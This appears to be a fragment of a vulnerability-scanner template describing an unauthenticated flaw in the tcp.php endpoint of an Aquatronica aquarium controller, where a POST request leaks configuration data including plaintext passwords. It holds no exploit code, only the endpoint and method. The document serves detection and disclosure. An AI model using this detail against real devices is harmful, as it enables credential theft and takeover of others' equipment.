  author: securityforeveryone
  description: 'The tcp.php endpoint on the Aquatronica controller is exposed to unauthenticated
    attackers over the network. This vulnerability allows remote attackers to send
    a POST request which can reveal sensitive configuration information, including
    plaintext passwords. This can lead to unauthorized access and control over the
    aquarium controller, compromising its security and potentially allowing attackers
    to manipulate its settings.
